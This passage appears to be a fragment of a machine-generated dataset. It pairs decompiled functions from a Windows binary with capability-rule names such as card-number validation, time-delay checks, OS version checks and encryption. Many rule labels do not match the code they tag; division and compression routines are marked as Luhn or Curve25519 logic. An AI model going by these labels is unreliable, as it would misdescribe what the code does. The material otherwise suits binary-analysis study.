iVar7 = 4;\n                }\n            }\n            iStack48 = iStack48 + 1;\n            puStack20 = puStack20 + 2;\n            iVar3 = iVar4;\n            uVar5 = uVar6;\n        } while (iStack48 <= param_1);\n    }\n    return;\n}\n",
        "token_count": 3796
    },
    "00403eb4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403eb4(uint param_1, int32_t *param_2)\n\n{\n    bool bVar1;\n    uint8_t *in_EAX;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    uint8_t uVar4;\n    uint8_t *puVar5;\n    uint8_t *puVar6;\n    int32_t iVar7;\n    \n    puVar6 = in_EAX;\n    if (in_EAX == NULL) {\ncode_r0x00403f2a:\n        puVar6 = puVar6 + 1;\n    }\n    else {\n        uVar2 = 0;\n        do {\n            puVar5 = puVar6;\n            uVar3 = *puVar5;\n            puVar6 = puVar5 + 1;\n        } while (uVar3 == 0x20);\n        bVar1 = false;\n        if (uVar3 == 0x2d) {\n            bVar1 = true;\ncode_r0x00403f3a:\n            uVar3 = *puVar6;\n            puVar6 = puVar5 + 2;\n        }\n        else if (uVar3 == 0x2b) goto code_r0x00403f3a;\n        if (((uVar3 == 0x24) || (uVar3 == 0x78)) || (uVar3 == 0x58)) {\ncode_r0x00403f3f:\n            uVar3 = *puVar6;\n            puVar6 = puVar6 + 1;\n            if (uVar3 != 0) {\n                do {\n                    if (0x60 < uVar3) {\n                        uVar3 = uVar3 - 0x20;\n                    }\n                    uVar4 = uVar3 - 0x30;\n                    if (9 < uVar4) {\n                        if (5 < uVar3 + 0xbf) goto code_r0x00403f33;\n                        uVar4 = uVar3 - 0x37;\n                    }\n                    if (0xfffffff < uVar2) goto code_r0x00403f33;\n                    uVar2 = uVar2 * 0x10 + uVar4;\n                    uVar3 = *puVar6;\n                    puVar6 = puVar6 + 1;\n                } while (uVar3 != 0);\ncode_r0x00403f7c:\n                iVar7 = 0;\n                goto code_r0x00403f7f;\n            }\n            goto code_r0x00403f2a;\n        }\n        if (uVar3 != 0x30) {\n            if (uVar3 != 0) goto code_r0x00403f06;\n            goto code_r0x00403f33;\n        }\n        uVar3 = *puVar6;\n        puVar6 = puVar6 + 1;\n        if ((uVar3 == 0x78) || (uVar3 == 0x58)) goto code_r0x00403f3f;\n        while (uVar3 != 0) {\ncode_r0x00403f06:\n            if ((9 < uVar3 - 0x30) || (0xccccccc < uVar2)) goto code_r0x00403f33;\n            uVar2 = uVar2 * 10 + (uVar3 - 0x30);\n            uVar3 = *puVar6;\n            puVar6 = puVar6 + 1;\n        }\n        if (bVar1) {\n            if ((-1 < uVar2) || (0 < uVar2)) goto code_r0x00403f7c;\n        }\n        else if (-1 < uVar2) goto code_r0x00403f7c;\n    }\ncode_r0x00403f33:\n    iVar7 = puVar6 - in_EAX;\ncode_r0x00403f7f:\n    *param_2 = iVar7;\n    return;\n}\n",
        "token_count": 876
    },
    "0040c8ec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nbool __cdecl fcn.0040c8ec(char *arg_8h)\n\n{\n    uint16_t uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint16_t *in_ECX;\n    int32_t *in_EDX;\n    int32_t iVar3;\n    uint var_8h;\n    uint var_4h;\n    \n    *arg_8h = '\\0';\n    fcn.0040c8c8();\n    iVar3 = *in_EDX;\n    uVar1 = 0;\n    while( true ) {\n        iVar2 = fcn.0040572c();\n        if (((iVar2 < iVar3) || (9 < *(in_EAX + -1 + iVar3) - 0x30U)) || (999 < uVar1)) break;\n        uVar1 = uVar1 * 10 + (*(in_EAX + -1 + iVar3) - 0x30);\n        iVar3 = iVar3 + 1;\n    }\n    iVar2 = *in_EDX;\n    if (iVar2 < iVar3) {\n        *arg_8h = iVar3 - *in_EDX;\n        *in_EDX = iVar3;\n        *in_ECX = uVar1;\n    }\n    return iVar2 < iVar3;\n}\n",
        "token_count": 285
    },
    "0041cfb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23"
        ],
        "decompiled_code": "\nuint32_t fcn.0041cfb0(void)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = fcn.0041ea90();\n    return uVar1 & 0xffffff00 | uVar1 == '\\t';\n}\n",
        "token_count": 56
    },
    "0042af34": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23"
        ],
        "decompiled_code": "\nint32_t * fcn.0042af34(void)\n\n{\n    uint arg_ch;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_18h;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    puStack44 = 0x42af4e;\n    var_8h = fcn.00428b88();\n    uStack48 = 0x42b013;\n    iStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puStack44 = &stack0xfffffffc;\n    (**(*var_8h + 0x40))();\n    (**(*var_8h + 0x34))();\n    fcn.0042915c();\n    fcn.00424948();\n    fcn.0042482c();\n    arg_ch = (**(*var_8h + 0x20))();\n    arg_8h = &fcn.0042af34::var_18h;\n    (**(*var_8h + 0x2c))();\n    fcn.00418388(arg_8h, arg_ch);\n    fcn.00424bd0();\n    uVar4 = 0;\n    do {\n        uVar3 = 0;\n        do {\n            uVar1 = uVar4 & 0x80000001;\n            if (uVar1 < 0) {\n                uVar1 = (uVar1 - 1 | 0xfffffffe) + 1;\n            }\n            uVar2 = uVar3 & 0x80000001;\n            if (uVar2 < 0) {\n                uVar2 = (uVar2 - 1 | 0xfffffffe) + 1;\n            }\n            if (uVar1 == uVar2) {\n                fcn.00424e78(var_4h);\n            }\n            uVar3 = uVar3 + 1;\n        } while (uVar3 != 9);\n        uVar4 = uVar4 + 1;\n    } while (uVar4 != 9);\n    fcn.00428e18();\n    *in_FS_OFFSET = arg_8h;\n    return var_8h;\n}\n",
        "token_count": 541
    },
    "0042c044": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042c044(int32_t arg_8h, int16_t *arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    uint var_104h;\n    uint var_4h;\n    \n    if (0x40 < *(arg_10h + 1)) {\n        fcn.0040db2c();\n        arg_ch = fcn.00404eb4();\n    }\n    if (*arg_ch == 9) {\n        var_4h = *(arg_ch + 4);\n    }\n    else if (*arg_ch == 0x4009) {\n        var_4h = **(arg_ch + 4);\n    }\n    else {\n        fcn.0042c02c();\n    }\n    fcn.0042bf4c(&var_104h);\n    if (arg_8h != 0) {\n        fcn.004115e8();\n    }\n    fcn.0042bbdc(arg_8h, arg_14h);\n    return;\n}\n",
        "token_count": 227
    },
    "004602b4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12",
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004602fa)\n\nvoid fcn.004602b4(void)\n\n{\n    uint32_t in_EAX;\n    uint32_t uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack292;\n    uint uStack288;\n    uchar *puStack284;\n    uint var_108h;\n    uint var_104h;\n    uint var_4h;\n    \n    puStack284 = &stack0xfffffffc;\n    uStack288 = 0x4603a6;\n    uStack292 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffedc;\n    fcn.0040546c();\n    fcn.00405504();\n    uVar1 = (in_EAX & 0xff) >> 4;\n    if (uVar1 < 10) {\n        fcn.00403ea8();\n        fcn.004056d0();\n    }\n    else {\n        fcn.00405654();\n    }\n    if ((in_EAX & 0xff) + uVar1 * -0x10 < 10) {\n        fcn.00403ea8();\n        fcn.004056d0();\n        fcn.00405738();\n    }\n    else {\n        fcn.00405654();\n        fcn.00405738();\n    }\n    *in_FS_OFFSET = uStack292;\n    puStack284 = 0x4603ad;\n    uStack288 = 0x46039d;\n    fcn.0040546c();\n    uStack288 = 0x4603a5;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 360
    },
    "0046ca7c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23"
        ],
        "decompiled_code": "\nvoid fcn.0046ca7c(void)\n\n{\n    int32_t iVar1;\n    uint16_t uVar2;\n    int32_t in_EAX;\n    uint32_t uVar3;\n    \n    if (*(in_EAX + 0x16b8) < 0xe) {\n        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | 2 << (*(in_EAX + 0x16b8) & 0x1f);\n        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + 3;\n    }\n    else {\n        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | 2 << (*(in_EAX + 0x16b8) & 0x1f);\n        iVar1 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar1) = *(in_EAX + 0x16b4);\n        iVar1 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar1) = *(in_EAX + 0x16b4) >> 8;\n        *(in_EAX + 0x16b4) = 2 >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + -0xd;\n    }\n    uVar2 = *0x491fb0;\n    uVar3 = str._a__a__a__a[0];\n    if (0x10 - uVar3 < *(in_EAX + 0x16b8)) {\n        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | *0x491fb0 << (*(in_EAX + 0x16b8) & 0x1f);\n        iVar1 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar1) = *(in_EAX + 0x16b4);\n        iVar1 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar1) = *(in_EAX + 0x16b4) >> 8;\n        *(in_EAX + 0x16b4) = uVar2 >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n        *(in_EAX + 0x16b8) = (uVar3 - 0x10) + *(in_EAX + 0x16b8);\n    }\n    else {\n        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | *0x491fb0 << (*(in_EAX + 0x16b8) & 0x1f);\n        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + uVar3;\n    }\n    fcn.0046d548();\n    iVar1 = *(in_EAX + 0x16b8);\n    if ((*(in_EAX + 0x16b0) + 0xb) - iVar1 < 9) {\n        if (iVar1 < 0xe) {\n            *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | 2 << (*(in_EAX + 0x16b8) & 0x1f);\n            *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + 3;\n        }\n        else {\n            *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | 2 << (iVar1 & 0x1f);\n            iVar1 = *(in_EAX + 0x14);\n            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n            *(*(in_EAX + 8) + iVar1) = *(in_EAX + 0x16b4);\n            iVar1 = *(in_EAX + 0x14);\n            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n            *(*(in_EAX + 8) + iVar1) = *(in_EAX + 0x16b4) >> 8;\n            *(in_EAX + 0x16b4) = 2 >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n            *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + -0xd;\n        }\n        uVar2 = *0x491fb0;\n        uVar3 = str._a__a__a__a[0];\n        if (0x10 - uVar3 < *(in_EAX + 0x16b8)) {\n            *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | *0x491fb0 << (*(in_EAX + 0x16b8) & 0x1f);\n            iVar1 = *(in_EAX + 0x14);\n            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n            *(*(in_EAX + 8) + iVar1) = *(in_EAX + 0x16b4);\n            iVar1 = *(in_EAX + 0x14);\n            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n            *(*(in_EAX + 8) + iVar1) = *(in_EAX + 0x16b4) >> 8;\n            *(in_EAX + 0x16b4) = uVar2 >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n            *(in_EAX + 0x16b8) = (uVar3 - 0x10) + *(in_EAX + 0x16b8);\n        }\n        else {\n            *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | *0x491fb0 << (*(in_EAX + 0x16b8) & 0x1f);\n            *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + uVar3;\n        }\n        fcn.0046d548();\n    }\n    *(in_EAX + 0x16b0) = 7;\n    return;\n}\n",
        "token_count": 1674
    },
    "0041d8c0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nunkbyte10 fcn.0041d8c0(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    unkbyte10 Stack16;\n    \n    cVar1 = fcn.0041ea90();\n    if (cVar1 == '\\x05') {\n        fcn.0041cf28();\n    }\n    else {\n        *(in_EAX + 0x10) = *(in_EAX + 0x10) + -1;\n        Stack16 = fcn.0041d8f8();\n    }\n    return Stack16;\n}\n",
        "token_count": 125
    },
    "00450d7c": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00450d7c(uint *param_1, uint *param_2)\n\n{\n    uint8_t uVar1;\n    uint uVar2;\n    uint uVar3;\n    int32_t *in_EAX;\n    uint uVar4;\n    \n    if (*(in_EAX + 0x5b) == '\\x05') {\n        uVar4 = CONCAT31(in_EAX >> 8, 1);\n    }\n    else {\n        uVar2 = *param_2;\n        uVar3 = *param_1;\n        uVar4 = (**(*in_EAX + 0x34))();\n        uVar1 = *(in_EAX + 0x5b);\n        if ((uVar1 == 0) || (uVar1 - 3 < 2)) {\n            *param_2 = uVar2;\n        }\n        param_2 = uVar1 - 3;\n        if (uVar1 < 3) {\n            *param_1 = uVar3;\n            param_2 = param_1;\n        }\n    }\n    return CONCAT44(param_2, uVar4);\n}\n",
        "token_count": 249
    },
    "00464cd8": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2",
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00464cd8(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint hKey;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = 0x464cec;\n    var_8h = param_2;\n    fcn.004058ec();\n    puStack20 = 0x464cf4;\n    fcn.004058ec();\n    uStack24 = 0x464e4a;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    uVar1 = fcn.00409e54();\n    // switch table (6 cases) at 0x464d1a\n    switch(uVar1) {\n    case 0:\n        uVar1 = fcn.004058fc(0, 0, 0, 0x20006, 0, &fcn.00464cd8::hKey, 0);\n        sub.advapi32.dll_RegCreateKeyExA(0x80000000, uVar1);\n        break;\n    case 1:\n        uVar1 = fcn.004058fc(0, 0, 0, 0x20006, 0, &fcn.00464cd8::hKey, 0);\n        sub.advapi32.dll_RegCreateKeyExA(0x80000001, uVar1);\n        break;\n    case 2:\n        uVar1 = fcn.004058fc(0, 0, 0, 0x20006, 0, &fcn.00464cd8::hKey, 0);\n        sub.advapi32.dll_RegCreateKeyExA(0x80000002, uVar1);\n        break;\n    case 3:\n        uVar1 = fcn.004058fc(0, 0, 0, 0x20006, 0, &fcn.00464cd8::hKey, 0);\n        sub.advapi32.dll_RegCreateKeyExA(0x80000003, uVar1);\n        break;\n    case 4:\n        uVar1 = fcn.004058fc(0, 0, 0, 0x20006, 0, &fcn.00464cd8::hKey, 0);\n        sub.advapi32.dll_RegCreateKeyExA(0x80000005, uVar1);\n        break;\n    case 5:\n        uVar1 = fcn.004058fc(0, 0, 0, 0x20006, 0, &fcn.00464cd8::hKey, 0);\n        sub.advapi32.dll_RegCreateKeyExA(0x80000006, uVar1);\n    }\n    sub.advapi32.dll_RegCloseKey_1();\n    *in_FS_OFFSET = hKey;\n    fcn.00405490(0x464e51);\n    return;\n}\n",
        "token_count": 683
    },
    "00464e58": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00464e58(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint hKey;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = 0x464e6f;\n    var_8h = param_2;\n    fcn.004058ec();\n    puStack24 = 0x464e77;\n    fcn.004058ec();\n    puStack24 = 0x464e7f;\n    fcn.004058ec();\n    uStack28 = 0x464fb4;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    uVar1 = fcn.00409e54();\n    // switch table (6 cases) at 0x464ea5\n    switch(uVar1) {\n    case 0:\n        uVar1 = fcn.004058fc(0, 0xf003f, &fcn.00464e58::hKey);\n        sub.advapi32.dll_RegOpenKeyExA_1(0x80000000, uVar1);\n        break;\n    case 1:\n        uVar1 = fcn.004058fc(0, 0xf003f, &fcn.00464e58::hKey);\n        sub.advapi32.dll_RegOpenKeyExA_1(0x80000001, uVar1);\n        break;\n    case 2:\n        uVar1 = fcn.004058fc(0, 0xf003f, &fcn.00464e58::hKey);\n        sub.advapi32.dll_RegOpenKeyExA_1(0x80000002, uVar1);\n        break;\n    case 3:\n        uVar1 = fcn.004058fc(0, 0xf003f, &fcn.00464e58::hKey);\n        sub.advapi32.dll_RegOpenKeyExA_1(0x80000003, uVar1);\n        break;\n    case 4:\n        uVar1 = fcn.004058fc(0, 0xf003f, &fcn.00464e58::hKey);\n        sub.advapi32.dll_RegOpenKeyExA_1(0x80000005, uVar1);\n        break;\n    case 5:\n        uVar1 = fcn.004058fc(0, 0xf003f, &fcn.00464e58::hKey);\n        sub.advapi32.dll_RegOpenKeyExA_1(0x80000006, uVar1);\n    }\n    uVar1 = fcn.004058fc();\n    sub.advapi32.dll_RegDeleteValueA(hKey, uVar1);\n    sub.advapi32.dll_RegCloseKey_1();\n    *in_FS_OFFSET = hKey;\n    fcn.00405490(0x464fbb);\n    return;\n}\n",
        "token_count": 678
    },
    "00464fc0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00464fc0(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint hKey;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = 0x464fd4;\n    var_8h = param_2;\n    fcn.004058ec();\n    puStack20 = 0x464fdc;\n    fcn.004058ec();\n    uStack24 = 0x46510d;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    uVar1 = fcn.00409e54();\n    // switch table (6 cases) at 0x465002\n    switch(uVar1) {\n    case 0:\n        uVar1 = fcn.004058fc(0, 0xf003f, &fcn.00464fc0::hKey);\n        sub.advapi32.dll_RegOpenKeyExA_1(0x80000000, uVar1);\n        break;\n    case 1:\n        uVar1 = fcn.004058fc(0, 0xf003f, &fcn.00464fc0::hKey);\n        sub.advapi32.dll_RegOpenKeyExA_1(0x80000001, uVar1);\n        break;\n    case 2:\n        uVar1 = fcn.004058fc(0, 0xf003f, &fcn.00464fc0::hKey);\n        sub.advapi32.dll_RegOpenKeyExA_1(0x80000002, uVar1);\n        break;\n    case 3:\n        uVar1 = fcn.004058fc(0, 0xf003f, &fcn.00464fc0::hKey);\n        sub.advapi32.dll_RegOpenKeyExA_1(0x80000003, uVar1);\n        break;\n    case 4:\n        uVar1 = fcn.004058fc(0, 0xf003f, &fcn.00464fc0::hKey);\n        sub.advapi32.dll_RegOpenKeyExA_1(0x80000005, uVar1);\n        break;\n    case 5:\n        uVar1 = fcn.004058fc(0, 0xf003f, &fcn.00464fc0::hKey);\n        sub.advapi32.dll_RegOpenKeyExA_1(0x80000006, uVar1);\n    }\n    sub.advapi32.dll_RegDeleteKeyA(hKey, 0x465118);\n    sub.advapi32.dll_RegCloseKey_1();\n    *in_FS_OFFSET = hKey;\n    fcn.00405490(0x465114);\n    return;\n}\n",
        "token_count": 638
    },
    "00404438": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad",
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00404438(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint *puStack20;\n    uint var_ch;\n    uint32_t var_8h;\n    uint hKey;\n    \n    var_8h = *0x490024;\n    puStack20 = &fcn.00404438::hKey;\n    uStack24 = 1;\n    uStack28 = 0;\n    uStack32 = 0x4044d0;\n    uStack36 = 0x80000002;\n    puStack40 = 0x40445f;\n    iVar1 = sub.advapi32.dll_RegOpenKeyExA();\n    if (iVar1 == 0) {\n        uStack44 = 0x4044a9;\n        uStack48 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffd0;\n        var_ch = 4;\n        uVar2 = hKey;\n        puStack40 = &stack0xfffffffc;\n        sub.advapi32.dll_RegQueryValueExA(hKey, 0x4044ec, 0, 0, &fcn.00404438::var_8h, &fcn.00404438::var_ch);\n        *in_FS_OFFSET = uVar2;\n        sub.advapi32.dll_RegCloseKey(hKey, 0x4044b0);\n        return;\n    }\n    *0x490024 = *0x490024 & 0xffc0 | var_8h & 0x3f;\n    return;\n}\n",
        "token_count": 396
    },
    "0045df84": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045df84(uint32_t param_1)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    \n    uVar1 = *(in_EAX + 0x10);\n    *(in_EAX + 0x10) = *(in_EAX + 0x10) + param_1;\n    if (*(in_EAX + 0x10) <= uVar1 && uVar1 != *(in_EAX + 0x10)) {\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n    }\n    uVar1 = 0x40 - (uVar1 & 0x3f);\n    if (param_1 < uVar1) {\n        fcn.004030ec();\n    }\n    else {\n        fcn.004030ec();\n        fcn.0045e0a8();\n        for (param_1 = param_1 - uVar1; 0x3f < param_1; param_1 = param_1 - 0x40) {\n            fcn.004030ec();\n            fcn.0045e0a8();\n        }\n        fcn.004030ec();\n    }\n    return;\n}\n",
        "token_count": 277
    },
    "0045e018": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nvoid fcn.0045e018(void)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    \n    uVar1 = *(in_EAX + 0x10) & 0x3f;\n    *(in_EAX + 0x18 + uVar1) = 0x80;\n    if (0x37 - uVar1 < 0) {\n        fcn.00403aac();\n        fcn.0045e0a8();\n    }\n    fcn.00403aac();\n    *(in_EAX + 0x50) = *(in_EAX + 0x10) * 8;\n    *(in_EAX + 0x54) = *(in_EAX + 0x14) * 8 | *(in_EAX + 0x10) >> 0x1d;\n    fcn.0045e0a8();\n    fcn.004030ec();\n    fcn.00403aac();\n    return;\n}\n",
        "token_count": 216
    },
    "004064a4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong __fastcall fcn.004064a4(uint param_1, uint32_t param_2, uint32_t param_3, uint32_t param_4)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    bool bVar4;\n    bool bVar5;\n    \n    if ((param_4 == 0) && ((param_2 == 0 || (param_3 == 0)))) {\n        in_EAX = CONCAT44(param_2, in_EAX) / param_3;\n        param_2 = 0;\n    }\n    else {\n        iVar1 = 0x40;\n        uVar3 = 0;\n        uVar2 = 0;\n        do {\n            bVar4 = in_EAX < 0;\n            in_EAX = in_EAX * 2;\n            bVar5 = param_2 < 0;\n            param_2 = param_2 << 1 | bVar4;\n            bVar4 = uVar2 < 0;\n            uVar2 = uVar2 << 1 | bVar5;\n            uVar3 = uVar3 << 1 | bVar4;\n            if ((param_4 <= uVar3) && ((param_4 < uVar3 || (param_3 <= uVar2)))) {\n                bVar4 = uVar2 < param_3;\n                uVar2 = uVar2 - param_3;\n                uVar3 = (uVar3 - param_4) - bVar4;\n                in_EAX = in_EAX + 1;\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return CONCAT44(param_2, in_EAX);\n}\n",
        "token_count": 392
    },
    "004064f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong __fastcall fcn.004064f0(uint param_1, uint32_t param_2, uint32_t param_3, uint32_t param_4)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    bool bVar4;\n    bool bVar5;\n    \n    if ((param_4 == 0) && ((param_2 == 0 || (param_3 == 0)))) {\n        uVar2 = CONCAT44(param_2, in_EAX) % param_3;\n        uVar3 = 0;\n    }\n    else {\n        iVar1 = 0x40;\n        uVar3 = 0;\n        uVar2 = 0;\n        do {\n            bVar4 = in_EAX < 0;\n            in_EAX = in_EAX * 2;\n            bVar5 = param_2 < 0;\n            param_2 = param_2 << 1 | bVar4;\n            bVar4 = uVar2 < 0;\n            uVar2 = uVar2 << 1 | bVar5;\n            uVar3 = uVar3 << 1 | bVar4;\n            if ((param_4 <= uVar3) && ((param_4 < uVar3 || (param_3 <= uVar2)))) {\n                bVar4 = uVar2 < param_3;\n                uVar2 = uVar2 - param_3;\n                uVar3 = (uVar3 - param_4) - bVar4;\n                in_EAX = in_EAX + 1;\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return CONCAT44(uVar3, uVar2);\n}\n",
        "token_count": 392
    },
    "0040dc70": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489",
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nvoid fcn.0040dc70(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iStack16;\n    uchar uStack12;\n    \n    iVar1 = fcn.004030cc();\n    for (iVar2 = 0; (iVar2 < 7 && (iVar1 != *(iVar2 * 8 + 0x490930))); iVar2 = iVar2 + 1) {\n    }\n    if (iVar2 < 7) {\n        iVar2 = fcn.0040da70();\n    }\n    else {\n        uStack12 = 0;\n        iStack16 = iVar1;\n        iVar2 = fcn.0040db68(0, &iStack16);\n    }\n    *(iVar2 + 0xc) = iVar1;\n    return;\n}\n",
        "token_count": 178
    },
    "00453144": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
